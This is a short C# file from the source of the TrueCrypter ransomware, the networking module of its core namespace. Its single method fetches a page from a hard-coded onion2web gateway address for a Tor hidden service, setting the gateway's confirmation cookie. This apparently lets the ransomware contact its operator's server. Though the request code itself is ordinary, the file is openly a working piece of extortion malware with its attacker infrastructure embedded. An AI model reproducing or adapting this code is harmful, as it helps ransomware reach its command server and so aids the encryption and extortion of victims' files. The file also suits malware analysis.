using System.IO;
using System.Net;
using System.Text;

namespace TrueCrypter.Ransomware.Core.Networking;

public static class NetworkClient
{
	public static string GetHtml(string Url)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Url);
			_ = httpWebRequest.Headers;
			httpWebRequest.Method = "GET";
			CookieContainer cookieContainer = new CookieContainer();
			cookieContainer.Add(new Cookie("onion2web_confirmed", "true")
			{
				Domain = "m2coftkce5g4gyza.onion.gq"
			});
			httpWebRequest.CookieContainer = cookieContainer;
			WebResponse response = httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			response.Close();
			return result;
		}
		catch
		{
			return "TrueCrypter: Could not parse HTML.";
		}
	}
}
